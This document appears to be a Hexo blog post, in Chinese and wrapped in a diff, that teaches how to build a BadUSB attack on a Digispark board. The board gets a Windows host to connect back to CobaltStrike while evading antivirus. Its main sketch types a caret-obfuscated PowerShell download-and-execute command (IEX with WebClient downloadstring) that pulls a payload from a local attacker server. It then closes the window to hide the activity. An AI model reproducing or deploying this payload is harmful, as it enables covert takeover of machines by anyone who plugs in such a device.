@@ -1,0 +1,238 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <title>BadUSB绕过杀软上线CobaltStrike | W000i</title>
+    <meta name="author" content="W00i" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>W000I</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;W000I</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>BadUSB绕过杀软上线CobaltStrike</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/19
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%85%8D%E6%9D%80/" style="color: #ffa2c4">
+                    免杀
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>Badusb的原理是利用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=HID&spm=1001.2101.3001.7020">HID</a>(Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等)进行攻击，将USB设备伪装使电脑识别为键盘，再利用USB设备中的微控制芯片，向主机发送命令，从而实现完全控制主机。</p>
+<span id="more"></span>
+
+<h1 id="购买digispark开发板"><a href="#购买digispark开发板" class="headerlink" title="购买digispark开发板"></a>购买digispark开发板</h1><p>随便在淘宝买一个digispark开发板，大概在15块<br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/678ec73625ddae1b959352b68bf023a.jpg" alt="678ec73625ddae1b959352b68bf023a"></p>
+<h2 id="配置ide"><a href="#配置ide" class="headerlink" title="配置ide"></a>配置ide</h2><p>安装Arduino IDE<br><a target="_blank" rel="noopener" href="https://www.arduino.cc/en/software">https://www.arduino.cc/en/software</a><br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image.png" alt="image"><br>下载后解压直接打开<br>文件-首选项<br>输入其他开发板管理器地址<br><a target="_blank" rel="noopener" href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a><br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319986984.png" alt="image-1693319986984"><br>点开工具-开发板-开发板管理器<br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319221887.png" alt="image-1693319221887"><br>搜索dig，安装Digistump AVR Boards by Digistump(我已经安装过了，所以显示移除)，下载源在GitHub，可能需要设置代理，可以在文件-首选项-网络，进行设置<br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319278571.png" alt="image-1693319278571"><br>安装驱动<br><a target="_blank" rel="noopener" href="https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7">https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7</a><br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319403943.png" alt="image-1693319403943"><br>下载后64位系统使用DPinst64.exe安装<br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319415075.png" alt="image-1693319415075"><br>切换到Arduino ，开发板选择16.5结尾那个<br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319453077.png" alt="image-1693319453077"></p>
+<h2 id="测试ide和开发板"><a href="#测试ide和开发板" class="headerlink" title="测试ide和开发板"></a>测试ide和开发板</h2><p>加入如下代码点击上传</p>
+<pre><code>#include &quot;DigiKeyboard.h&quot;
+#define MOD_SHIFT_LEFT      (1&lt;&lt;1)
+#define MOD_CONTROL_LEFT    (1&lt;&lt;0)
+#define KEY_ENTER   40
+#define KEY_CAPS_LOCK 0x39
+
+void setup() &#123;
+DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //win+r
+DigiKeyboard.delay(500);
+DigiKeyboard.print(F(&quot;cmd&quot;)); //输入cmd
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER); //回车
+&#125;
+
+void loop() &#123;
+&#125;
+</code></pre>
+<p><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319570384.png" alt="image-1693319570384"><br>编译结束后插入开发板<br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319615648.png" alt="image-1693319615648"><br>输出窗口提示成功，命令窗口也打开了</p>
+<h2 id="调试上线代码"><a href="#调试上线代码" class="headerlink" title="调试上线代码"></a>调试上线代码</h2><p>使用下面的代码，在函数DigiKeyboard.print替换成自己的上线地址</p>
+<pre><code>#include &quot;DigiKeyboard.h&quot;
+#define MOD_SHIFT_LEFT      (1&lt;&lt;1)
+#define MOD_CONTROL_LEFT    (1&lt;&lt;0)
+#define KEY_ENTER   40
+#define KEY_CAPS_LOCK 0x39
+
+void setup() &#123;
+delay(500);
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  // Win+r
+DigiKeyboard.sendKeyStroke(0x39);  // 锁定大小写
+delay(500);
+DigiKeyboard.print(F(&quot;cmd /c e^ch^o set-ali^as -na^me l -va^lue IE^X;l((n^ew-object n^et.web^client).down^loads^trin^g(&#39;htt^p://19^2.16^8.7^4.12^8:81/^A&#39;))|po^w^ersh^ell -&quot;));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(3000);//等待上线
+DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);  //Ctrl+c
+delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);//Alt+f4
+&#125;
+
+void loop() &#123;
+
+&#125;
+</code></pre>
+<p>上传烧录<br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319752351.png" alt="image-1693319752351"><br>烧录完成后会自动重新连接一次，再次连接的时候会自动模拟键盘输入使用powershell上线<br><img src="/../imgs/BadUSB%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BFCobaltStrike-badusb/image-1693319760853.png" alt="image-1693319760853"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 W000i
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;W00i
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+	
+	
+	{% if theme.fireworks %}
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
+    {% endif %}
+ 
+</body>
+</html>
